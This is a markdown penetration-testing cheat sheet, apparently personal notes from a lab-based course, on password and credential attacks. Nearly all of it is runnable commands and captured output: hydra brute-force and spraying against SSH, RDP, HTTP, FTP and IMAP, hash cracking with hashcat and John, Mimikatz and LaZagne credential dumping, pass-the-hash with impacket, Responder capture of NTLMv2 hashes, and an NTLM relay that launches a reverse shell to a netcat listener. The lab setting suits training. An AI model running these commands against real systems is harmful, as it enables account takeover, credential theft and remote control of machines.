#### Brute Forcing
| **Brute force**                                                                                                                                           | **Description**                              |
| --------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| `hydra -l george -P /usr/share/wordlists/rockyou.txt -e nsr -s 2222 ssh://192.168.50.201 -vV`                                                             | SSH                                          |
| `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" -e nsr rdp://192.168.50.202 -vV`                                               | RDP - Password spraying                      |
| `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 -e nsr http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" -vV` | HTTP Form                                    |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.213.61 -vV`                                                                   | FTP                                          |
| `hydra -L users.txt -P cewl-list.txt -e nsr -f 192.168.235.137 imap -u -f -vV`                                                                            | IMAP                                         |
| `hydra -L wordlist.txt -P wordlist.txt -e nsr -u -f SERVER_IP -s PORT http-get / -vV`                                                                     | Basic Auth Brute Force - User/Pass Wordlists |

#### Hash cracking

> [!info] We can use Hash-identifier in kali linux to find the hash type

Find Hashcat modes for specific hash type:
```bash
hashcat --help | grep -i "ntlm"
```

| **Hash cracking** | **Description** |
| ---- | ---- |
| `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` | Hashcat NTLM hash with rule (we can skip the rule) |
| `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/hashcat/rules/best64.rule ssh.hash` | John the Ripper with rule (we can skip the rule) |

#### Windows dumping
| **Windows dumping** | **Description** |
| ---- | ---- |
| `privilege::debug`<br>`token::elevate`<br>`sekurlsa::logonpasswords` | Mimikatz - all available sources |
| `privilege::debug`<br>`token::elevate`<br>`lsadump::sam` | Mimikatz - extract NTLM hashes from the sam |
| `laZagne.exe all -oA -output C:\Users\test\Desktop` | LaZagne - extract all and store in a file |

| **Pass the Hash** | **Description** |
| ---- | ---- |
| `smbclient \\192.168.50.212\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b` | SMBClient |
| `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212` | Impacket PSExec |
| `impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212` | Impacket WMIExec |

- Stealing NTLMv2 hashes with Responder:
```bash
C:\Windows\system32>dir \\192.168.119.2\share\test
dir \\192.168.119.2\share\test
Access is denied.

-----------------

kali@kali:~$ ip a   

[...SNIP...]

14: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.164/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::c9e4:7665:dbb4:dc37/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever

kali@kali:~$ sudo responder -I tun0 

[...SNIP...]

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000

kali@kali:~$ cat paul.hash   
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...

kali@kali:~$ hashcat --help | grep -i "ntlmv2"
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol

kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting

PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d00340044004e004800550058004300340054004900430004003400570049004e002d00340044004e00480055005800430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d0052002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000000000000000:123Password123
```

In web we can get the same just modifying the request to point our server

![[Pasted image 20240122130319.png]]

- NTLM Relay (two servers needed, one to steal and one to authenticate): setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice (Basically, we steal NTLMv2 from ip1 and authenticate in ip2)
```bash
(WE ESTABLISH A NTLM RELAY POINTING TO SERVER 2)

kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP SERVER 2> -c "<PS encoded reverse shell to our Kali in port 8080>" 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

--------------

(HERE WE WILL RECEIVE THE CONNECTION FOR SERVER 2)

kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080

--------------

(WE NEED TO EXECUTE THE COMMAND IN SERVER 1, WHERE WE HAVE A SHELL)

C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\192.168.119.2\test
```
